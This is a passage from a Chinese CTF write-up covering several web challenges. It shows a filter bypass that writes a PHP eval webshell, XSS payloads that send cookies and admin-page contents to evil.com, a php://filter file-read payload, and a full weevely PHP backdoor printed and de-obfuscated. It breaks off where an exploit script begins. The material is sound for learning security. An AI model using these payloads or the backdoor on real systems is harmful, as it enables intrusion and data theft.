<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;content&#x27;</span>]))&#123;</span><br><span class="line">    $filename = <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line">    $content = $_GET[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(is_int(stripos($content, <span class="string">&#x27;php&#x27;</span>)) || is_int(stripos($content, <span class="string">&#x27;&lt;&#x27;</span>))) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        file_put_contents($filename, $content);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>目的是要写入一个webshell，文件名是config.php，所以不需要担心文件后缀的问题，但是源码里不允许在文件内容中出现<code>php</code>以及<code>&lt;</code>，类似Basic PHP 1，当传入的content是一个数组时，<code>stripos</code>函数将会返回false，这样就可以绕过<code>is_int</code>函数。<br>payload为<br><code>/index.php?content[]=&lt;%3Fphp+eval%28%24_GET%5Ba%5D%29%3B</code></p>
<p>最后获取flag为<br><code>flag&#123;pwnhub_first_shalon_ctf_web_php&#125;</code></p>
<hr>
<h1 id="BabyXSS-100"><a href="#BabyXSS-100" class="headerlink" title="BabyXSS(100)"></a>BabyXSS(100)</h1><p>是一个很简单的打cookie的XSS，提到了flag在admin.php里，但是需要admin的cookie。<br>测试paylaod</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;http://evil.com/xss/&#x27;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>发现有反应，那就可以直接在参数里带上cookie</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&#x27;http://evil.com/xss/?cookie=&#x27;</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie)/&gt;</span><br></pre></td></tr></table></figure>
<p>但是发现发来的cookie是空的，所以拿不到管理员的cookie，但是可以用CSRF，通过XSS用管理员的cookie去访问admin.php，最后再把访问到的结果发到XSS服务器上。<br>payload如下</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line">    if (xhr.readyState == 4)&#123;</span><br><span class="line"><span class="javascript">        img = <span class="built_in">document</span>.createElement(<span class="string">&#x27;img&#x27;</span>);</span></span><br><span class="line"><span class="javascript">        img.src = <span class="string">&#x27;http://evil.com/xss/?content=&#x27;</span> + <span class="built_in">escape</span>(xhr.responseText);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.getElementsByTagName(<span class="string">&#x27;body&#x27;</span>)[<span class="number">0</span>].appendChild(img);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="javascript">xhr.open(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;/admin.php&#x27;</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">xhr.send(<span class="literal">null</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>最后获得的flag为<br><code>flag&#123;this_is_a_xss_flag&#125;</code></p>
<hr>
<h1 id="BasicFileInclude-150"><a href="#BasicFileInclude-150" class="headerlink" title="BasicFileInclude(150)"></a>BasicFileInclude(150)</h1><p>最简单的文件包含题目，url里直接包含了flag.php，那么就可以使用php伪协议读取flag.php，由于再后端结尾自动拼接了”.php”，所以就不用加上php文件后缀了。<br>payload如下<br><code>?page=php://filter/read=convert.base64-encode/resource=flag</code></p>
<p>最后获得flag为<br><code>flag&#123;really_basic_skill_web_dog_should_know&#125;</code></p>
<hr>
<h1 id="FxxkingBackdoor-175"><a href="#FxxkingBackdoor-175" class="headerlink" title="FxxkingBackdoor(175)"></a>FxxkingBackdoor(175)</h1><p>下载打开backdoor.php，这是一个木马软件weevely生成的php木马</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Signature For Report</span></span><br><span class="line"><span class="comment">*/</span>$c=<span class="string">&#x27;ue)ery)e&quot;],$q);$q=array_valu)ees($q);preg_)ema)etch_all()e&quot;/([\w]&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span>$e=<span class="string">&#x27;$i&lt;$l);$j++)e,$i++)&#123;$o.=$t&#123;)e$i&#125;^$k&#123;$j&#125;;&#125;&#125;retur)en )e$o;&#125;$r=$_SER&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span>$G=<span class="string">&#x27;o=ob_get_conte)ents();ob_e)end_cle)ean();$d=base)e64_encod)ee(x(g&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span>$g=<span class="string">&#x27;$)ekh)e=&quot;d0)e3a&quot;;$kf=&quot;1f3c&quot;;function x($t)e,$k)&#123;$c=strlen($k);$l=&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span>$F=<span class="string">&#x27;=strpos($s[)e$i],$f);)eif($e)&#123;$k=$kh.$kf;ob)e_sta)ert();@eval)e(@&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span>$I=<span class="string">&#x27;gz)eunco)empress(@)ex(@b)ease6)e4_decode(p)ere)eg_repl)eace()ear)&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span>$h=<span class="string">&#x27;_sta)ert();$s=&amp;$_SES)eSION;$ss=&quot;substr&quot;;$sl=&quot;s)etrtolower&quot;;$i=)e$&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span>$K=<span class="string">&#x27;U)eAGE&quot;];if($rr&amp;&amp;)e$ra)&#123;$u=pa)erse_url($rr))e;parse)e_str)e($u[&quot;q&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span>$M=<span class="string">&#x27;m[1][)e0].$m[1])e[1];$h=$sl($ss(m)ed5($i.$k)eh),0,3)e));$f=$sl($s&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span>$C=<span class="string">&#x27;s()emd5($i)e.$kf),0,3));$p=&quot;&quot;;)efor($z=1;$z&lt;count($m[1]);$z++)$p.&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span>$n=<span class="string">&#x27;)eVE)eR;$rr=@$r[&quot;HTTP_REFERE)eR&quot;)e];$ra=)e@$r[&quot;HTTP_AC)eCEPT_LANG&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span>$p=<span class="string">&#x27;=$q)e[$m[2][$z]];if(strpos()e$p)e,$)eh)===0)&#123;$s[$)ei])e=&quot;)e&quot;;$p=$&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span>$s=<span class="string">&#x27;zcompress($o),$k));print(&quot;&lt;$k&gt;$d&lt;/$)ek&gt;&quot;);@sess)eion_de)estroy();&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span>$R=<span class="string">&#x27;)ess($)ep,3))e;&#125;if(array_key_exists()e$i,$)es))e)&#123;$s)e[$i].=$p;$e&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span>$V=<span class="string">&#x27;strlen($t);$o=&quot;&quot;;f)eor($)ei=0;)e$i)e&lt;$l;)e)&#123;)efor($j=0)e;($j&lt;$c&amp;&amp;&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span>$y=<span class="string">&#x27;)[\w-]+(?:;q=0.([\d]))?)e,?/&quot;,$ra,$m);i)ef()e$q&amp;&amp;)e$m)&#123;@sessi)eon&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span>$P=<span class="string">&#x27;eray(&quot;/_/&quot;,&quot;/-/&quot;),array(&quot;/&quot;,&quot;+&quot;),$ss()e$s[$i],0)e,$e))),$)ek)));$&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span>$t=<span class="string">&#x27;&#125;&#125;&#125;&#125;&#x27;</span>;$Y=str_replace(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;crbebbabte_funcbbtion&#x27;</span>);<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span>$L=str_replace(<span class="string">&#x27;)e&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$g.$V.$e.$n.$K.$c.$y.$h.$M.$C.$p.$R.$F.$I.$P.$G.$s.$t);<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span><span class="keyword">echo</span> $L.<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;<span class="keyword">echo</span> $Y;$v=$Y(<span class="string">&#x27;&#x27;</span>,$L);$v();<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>最前面都是经过混淆后的代码，最后真正开始执行的语句是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$v=$Y(<span class="string">&#x27;&#x27;</span>,$L);$v();</span><br></pre></td></tr></table></figure>

<p>所以在这条语句前打印一下看看它执行了什么</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> $Y.<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;highlight_string($L);$v=$Y(<span class="string">&#x27;&#x27;</span>,$L);$v();</span><br></pre></td></tr></table></figure>

<p>输出如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">create_function</span><br><span class="line">$kh=<span class="string">&quot;d03a&quot;</span>;$kf=<span class="string">&quot;1f3c&quot;</span>;<span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params">$t,$k</span>)</span>&#123;$c=strlen($k);$l=strlen($t);$o=<span class="string">&quot;&quot;</span>;<span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;$l;)&#123;<span class="keyword">for</span>($j=<span class="number">0</span>;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++)&#123;$o.=$t&#123;$i&#125;^$k&#123;$j&#125;;&#125;&#125;<span class="keyword">return</span> $o;&#125;$r=$_SERVER;$rr=@$r[<span class="string">&quot;HTTP_REFERER&quot;</span>];$ra=@$r[<span class="string">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span>];<span class="keyword">if</span>($rr&amp;&amp;$ra)&#123;$u=parse_url($rr);parse_str($u[<span class="string">&quot;query&quot;</span>],$q);$q=array_values($q);preg_match_all(<span class="string">&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;</span>,$ra,$m);<span class="keyword">if</span>($q&amp;&amp;$m)&#123;@session_start();$s=&amp;$_SESSION;$ss=<span class="string">&quot;substr&quot;</span>;$sl=<span class="string">&quot;strtolower&quot;</span>;$i=$m[<span class="number">1</span>][<span class="number">0</span>].$m[<span class="number">1</span>][<span class="number">1</span>];$h=$sl($ss(md5($i.$kh),<span class="number">0</span>,<span class="number">3</span>));$f=$sl($ss(md5($i.$kf),<span class="number">0</span>,<span class="number">3</span>));$p=<span class="string">&quot;&quot;</span>;<span class="keyword">for</span>($z=<span class="number">1</span>;$z&lt;count($m[<span class="number">1</span>]);$z++)$p.=$q[$m[<span class="number">2</span>][$z]];<span class="keyword">if</span>(strpos($p,$h)===<span class="number">0</span>)&#123;$s[$i]=<span class="string">&quot;&quot;</span>;$p=$ss($p,<span class="number">3</span>);&#125;<span class="keyword">if</span>(array_key_exists($i,$s))&#123;$s[$i].=$p;$e=strpos($s[$i],$f);<span class="keyword">if</span>($e)&#123;$k=$kh.$kf;ob_start();@<span class="keyword">eval</span>(@gzuncompress(@x(@base64_decode(preg_replace(<span class="keyword">array</span>(<span class="string">&quot;/_/&quot;</span>,<span class="string">&quot;/-/&quot;</span>),<span class="keyword">array</span>(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;+&quot;</span>),$ss($s[$i],<span class="number">0</span>,$e))),$k)));$o=ob_get_contents();ob_end_clean();$d=base64_encode(x(gzcompress($o),$k));<span class="keyword">print</span>(<span class="string">&quot;&lt;<span class="subst">$k</span>&gt;<span class="subst">$d</span>&lt;/<span class="subst">$k</span>&gt;&quot;</span>);@session_destroy();&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>因此L里面存储的是webshell的代码，Y是create_funciton，所以最后创建了一个匿名函数v去执行webshell，将L的代码格式化后如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">$kh=<span class="string">&quot;d03a&quot;</span>;</span><br><span class="line">$kf=<span class="string">&quot;1f3c&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params">$t,$k</span>) </span>&#123;</span><br><span class="line">    $c=strlen($k);</span><br><span class="line">    $l=strlen($t);</span><br><span class="line">    $o=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>;$i&lt;$l;) &#123;</span><br><span class="line">        <span class="keyword">for</span> ($j=<span class="number">0</span>;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++) &#123;</span><br><span class="line">            $o.=$t &#123;</span><br><span class="line">                $i</span><br><span class="line">            &#125;</span><br><span class="line">            ^$k &#123;</span><br><span class="line">                $j</span><br><span class="line">            &#125;</span><br><span class="line">            ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $o;</span><br><span class="line">&#125;</span><br><span class="line">$r=$_SERVER;</span><br><span class="line">$rr=@$r[<span class="string">&quot;HTTP_REFERER&quot;</span>];</span><br><span class="line">$ra=@$r[<span class="string">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>($rr&amp;&amp;$ra) &#123;</span><br><span class="line">    $u=parse_url($rr);</span><br><span class="line">    parse_str($u[<span class="string">&quot;query&quot;</span>],$q);</span><br><span class="line">    $q=array_values($q);</span><br><span class="line">    preg_match_all(<span class="string">&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;</span>,$ra,$m);</span><br><span class="line">    <span class="keyword">if</span>($q&amp;&amp;$m) &#123;</span><br><span class="line">        @session_start();</span><br><span class="line">        $s=&amp;$_SESSION;</span><br><span class="line">        $ss=<span class="string">&quot;substr&quot;</span>;</span><br><span class="line">        $sl=<span class="string">&quot;strtolower&quot;</span>;</span><br><span class="line">        $i=$m[<span class="number">1</span>][<span class="number">0</span>].$m[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">        $h=$sl($ss(md5($i.$kh),<span class="number">0</span>,<span class="number">3</span>));</span><br><span class="line">        $f=$sl($ss(md5($i.$kf),<span class="number">0</span>,<span class="number">3</span>));</span><br><span class="line">        $p=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> ($z=<span class="number">1</span>;$z&lt;count($m[<span class="number">1</span>]);$z++)$p.=$q[$m[<span class="number">2</span>][$z]];</span><br><span class="line">        <span class="keyword">if</span>(strpos($p,$h)===<span class="number">0</span>) &#123;</span><br><span class="line">            $s[$i]=<span class="string">&quot;&quot;</span>;</span><br><span class="line">            $p=$ss($p,<span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(array_key_exists($i,$s)) &#123;</span><br><span class="line">            $s[$i].=$p;</span><br><span class="line">            $e=strpos($s[$i],$f);</span><br><span class="line">            <span class="keyword">if</span>($e) &#123;</span><br><span class="line">                $k=$kh.$kf;</span><br><span class="line">                ob_start();</span><br><span class="line">                @<span class="keyword">eval</span>(@gzuncompress(@x(@base64_decode(preg_replace(<span class="keyword">array</span>(<span class="string">&quot;/_/&quot;</span>,<span class="string">&quot;/-/&quot;</span>),<span class="keyword">array</span>(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;+&quot;</span>),$ss($s[$i],<span class="number">0</span>,$e))),$k)));</span><br><span class="line">                $o=ob_get_contents();</span><br><span class="line">                ob_end_clean();</span><br><span class="line">                $d=base64_encode(x(gzcompress($o),$k));</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">&quot;&lt;<span class="subst">$k</span>&gt;<span class="subst">$d</span>&lt;/<span class="subst">$k</span>&gt;&quot;</span>);</span><br><span class="line">                @session_destroy();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再进一步反混淆</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">$kh=<span class="string">&quot;d03a&quot;</span>;</span><br><span class="line">$kf=<span class="string">&quot;1f3c&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_xor</span>(<span class="params">$content, $key</span>) </span>&#123;</span><br><span class="line">    $result = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i&lt;strlen($content);)</span><br><span class="line">        <span class="keyword">for</span> ($j=<span class="number">0</span>; $j&lt;strlen($key)&amp;&amp;$i&lt;strlen($content); $j++, $i++)</span><br><span class="line">            $result .= $content&#123;$i&#125;^$key&#123;$j&#125;;</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$r = $_SERVER;</span><br><span class="line">$referer = @$r[<span class="string">&quot;HTTP_REFERER&quot;</span>];</span><br><span class="line">$accept_language = @$r[<span class="string">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>($referer &amp;&amp; $accept_language) &#123;</span><br><span class="line">    <span class="comment">// 解析http referer的query</span></span><br><span class="line">    parse_str(parse_url($referer)[<span class="string">&quot;query&quot;</span>], $query);</span><br><span class="line">    $query = array_values($query);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在accept language里找到paylaod参数</span></span><br><span class="line">    <span class="comment">// 例如fr-CH, fr;q=0.0, en;q=0.1, de;q=0.2, *;q=0.5</span></span><br><span class="line">    <span class="comment">// 结果为</span></span><br><span class="line">    <span class="comment">// matched[0] = &#123;0 =&gt; &#x27;fr-CH,&#x27;, 1 =&gt; &#x27;fr;q=0.0,&#x27;, 2 =&gt; &#x27;en;q=0.1,&#x27;, 3 =&gt; &#x27;de;q=0.2,&#x27;&#125;</span></span><br><span class="line">    <span class="comment">// matched[1] = &#123;0 =&gt; &#x27;f&#x27;,      1 =&gt; &#x27;f&#x27;,         2 =&gt; &#x27;e&#x27;,         3 =&gt; &#x27;d&#x27;&#125;</span></span><br><span class="line">    <span class="comment">// matched[2] = &#123;0 =&gt; &#x27;&#x27;,       1 =&gt; &#x27;0&#x27;,         2 =&gt; &#x27;1&#x27;,         3 =&gt; &#x27;2&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line">    preg_match_all(<span class="string">&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;</span>, $accept_language, $matched);</span><br><span class="line">    <span class="keyword">if</span>($query &amp;&amp; $matched) &#123;</span><br><span class="line">        @session_start();</span><br><span class="line">        <span class="comment">// 取前两个权重开头字母作为用户标识，例如从fr-CH, fr;q=0.0, en;q=0.1, de;q=0.2, *;q=0.5里取出&#x27;ff&#x27;</span></span><br><span class="line">        $user = $matched[<span class="number">1</span>][<span class="number">0</span>].$matched[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">        <span class="comment">// 计算payload起始和结束标识符</span></span><br><span class="line">        $head = strtolower(substr(md5($user.$kh), <span class="number">0</span>, <span class="number">3</span>));  <span class="comment">// md5(&quot;ff&quot; + kh)[:3]</span></span><br><span class="line">        $tail = strtolower(substr(md5($user.$kf), <span class="number">0</span>, <span class="number">3</span>));  <span class="comment">// md5(&quot;ff&quot; + kf)[:3]</span></span><br><span class="line"></span><br><span class="line">        $payload = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i=<span class="number">1</span>; $i&lt;count($matched[<span class="number">1</span>]); $i++)</span><br><span class="line">            <span class="comment">// 取出所有的权重数字作为在query里的payload参数</span></span><br><span class="line">            <span class="comment">// 例如从fr-CH, fr;q=0.0, en;q=0.1, de;q=0.2, *;q=0.5取出&quot;0&quot;, &quot;1&quot; 和 &quot;2&quot;，并且在query里寻找第0，第1和第2个参数</span></span><br><span class="line">            $payload .= $query[$matched[<span class="number">2</span>][$i]];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果payload以head开头</span></span><br><span class="line">        <span class="keyword">if</span>(strpos($payload, $head) === <span class="number">0</span>) &#123;</span><br><span class="line">            $_SESSION[$user] = <span class="string">&quot;&quot;</span>;  <span class="comment">// 清空session[&quot;ff&quot;]</span></span><br><span class="line">            $payload = substr($payload, <span class="number">3</span>);  <span class="comment">// 从payload的开头中剪掉head</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果user有session，即payload以head开头</span></span><br><span class="line">        <span class="keyword">if</span>(array_key_exists($user, $_SESSION)) &#123;</span><br><span class="line">            $_SESSION[$user] .= $payload;  <span class="comment">// 获取payload</span></span><br><span class="line">            <span class="comment">// 根据tail标识符找到payload结尾</span></span><br><span class="line">            $pos = strpos($_SESSION[$user], $tail);</span><br><span class="line">            <span class="keyword">if</span>($pos) &#123;</span><br><span class="line">                <span class="comment">// 异或用的key</span></span><br><span class="line">                $key = $kh.$kf;</span><br><span class="line"></span><br><span class="line">                ob_start();</span><br><span class="line">                $payload = substr($_SESSION[$user], <span class="number">0</span>, $pos);  <span class="comment">// 截取payload，从这里开始的paylaod就是去除了head和tail的</span></span><br><span class="line">                $payload = preg_replace(<span class="keyword">array</span>(<span class="string">&quot;/_/&quot;</span>,<span class="string">&quot;/-/&quot;</span>), <span class="keyword">array</span>(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;+&quot;</span>), $payload);  <span class="comment">// 将_和-替换为/和+</span></span><br><span class="line">                $payload = @base64_decode($payload);  <span class="comment">// base64解码</span></span><br><span class="line">                $payload = @_xor($payload, $key);  <span class="comment">// 异或解密</span></span><br><span class="line">                $payload = @gzuncompress($payload);  <span class="comment">// 解压缩</span></span><br><span class="line">                @<span class="keyword">eval</span>($payload);  <span class="comment">// 执行代码</span></span><br><span class="line">                $output = ob_get_contents(); <span class="comment">// 获取执行结果</span></span><br><span class="line">                ob_end_clean();</span><br><span class="line">                <span class="comment">// 将执行结果压缩，异或加密，base64编码后输出到网页中</span></span><br><span class="line">                $output = base64_encode(_xor(gzcompress($output),$key));</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">&quot;&lt;<span class="subst">$key</span>&gt;<span class="subst">$output</span>&lt;/<span class="subst">$key</span>&gt;&quot;</span>);</span><br><span class="line">                @session_destroy();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>总的来说原理就是先用accept language里提取出每个权重的首字母和权重数字，将前两个权重首字母作为用户的标识，将所有的权重数字作为payload数组的下标，payload分开以数组的方式存放在referer的查询里，并且payload要以用户标识加kh的MD5前三位开头，以用户表示加kf的MD5的前三位结尾。</p>
<p>编写利用脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">url = <span 